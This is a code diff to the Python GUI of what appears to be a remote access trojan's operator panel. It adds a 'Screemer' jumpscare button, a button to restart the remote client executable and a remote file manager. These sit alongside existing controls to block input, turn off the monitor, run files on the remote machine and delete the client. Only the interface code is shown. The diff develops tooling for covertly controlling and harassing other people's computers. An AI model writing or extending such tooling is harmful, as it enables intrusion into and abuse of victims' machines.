@@ -53,6 +53,9 @@ class FunctionApp(ctk.CTk):
         self.set_wallppr_btn = ctk.CTkButton(self.fun_tab, text="Set Wallpaper", height=50, width=200,
                                            command=lambda: self.comm.set_wallpaper(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
+        self.screemer_btn = ctk.CTkButton(self.fun_tab, text="Screemer", height=50, width=200,
+                                           command=lambda: self.comm.screemer(self.ip, self.port), font=('Bold', 15), fg_color='red')
+        
         self.input_msg_box = ctk.CTkEntry(self.fun_tab, width=300, height=40, placeholder_text='Enter a message', font=('Bold', 20), text_color='green')
 
         self.send_msg_btn = ctk.CTkButton(self.fun_tab, text="Send\nMsg Box", height=50, width=100,
@@ -66,6 +69,7 @@ class FunctionApp(ctk.CTk):
         
         self.blockinput_btn.place(x=10, y=70)
         self.input_link.place(x=10, y=10)
+        self.screemer_btn.place(x=330, y=140)
         self.open_link_btn.place(x=330, y=7)
         self.off_monitor_btn.place(x=330, y=70)
         self.on_monitor_btn.place(x=435, y=70)
@@ -88,6 +92,9 @@ class FunctionApp(ctk.CTk):
         self.remote_btn = ctk.CTkButton(self.sys_tab, text='Remote Tool', height=50, width=200,
                                 command=lambda: self.comm.remote_tool(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
+        self.restart_btn = ctk.CTkButton(self.sys_tab, text='RESTART EXE CLIENT', height=50, width=500, fg_color='green', text_color="black", 
+                                       command=lambda: self.comm.post_msg(self.ip, self.port, "restart"), font=('Bold', 20))
+
         self.kill_btn = ctk.CTkButton(self.sys_tab, text='! DELETE CLIENT !', height=50, width=500, fg_color='red', text_color="yellow", 
                                        command=lambda: self.comm.killer(self.ip, self.port, True), font=('Bold', 20))
 
@@ -96,6 +103,7 @@ class FunctionApp(ctk.CTk):
         
         self.off_btn.place(x=330, y=70)
         self.reboot_btn.place(x=430, y=70)
+        self.restart_btn.pack(side='bottom', pady=10, padx=10)
         self.kill_btn.pack(side='bottom', pady=10, padx=10)
         self.disconnect_btn.pack(side='bottom', pady=10, padx=10)
         self.console_btn.place(x=10, y=10)
@@ -106,9 +114,13 @@ class FunctionApp(ctk.CTk):
         self.send_and_run_btn = ctk.CTkButton(self.file_tab, text='Run File From Disk', height=50, width=200,
                                        command=lambda: self.comm.send_and_run(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
-        self.send_file_btn = ctk.CTkButton(self.file_tab, text='Sendfile', height=50, width=200,
+        self.send_file_btn = ctk.CTkButton(self.file_tab, text='SendFile', height=50, width=200,
                                        command=lambda: self.comm.send_file(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
         
+        self.file_manager_btn = ctk.CTkButton(self.file_tab, text='FileManager', height=50, width=200,
+                                       command=lambda: self.comm.file_manager(self.ip, self.port), font=('Bold', 15), fg_color='#9370DB')
+        
+        self.file_manager_btn.pack(side='top', pady=10, padx=50)
         self.send_file_btn.pack(side='top', pady=10, padx=50)
         self.send_and_run_btn.pack(side='top', pady=10, padx=50)
         
